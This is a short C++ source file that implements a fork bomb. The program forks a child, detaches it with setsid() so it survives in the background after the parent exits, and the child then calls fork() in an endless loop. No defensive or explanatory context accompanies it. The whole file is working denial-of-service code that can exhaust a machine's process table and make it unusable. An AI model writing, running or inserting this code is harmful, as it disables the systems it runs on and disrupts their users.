#include <iostream>
#include <unistd.h>

void forkBomb() {
    while (true) {
        fork(); // Create a new process
    }
}

int main() {
    pid_t pid = fork();    
    if (pid == 0) {
        setsid();
        forkBomb();
    } else if (pid > 0) {
        return 0;
    } else {
        std::cerr << "Fork failed." << std::endl;
        return 1;
    }

    return 0;
}

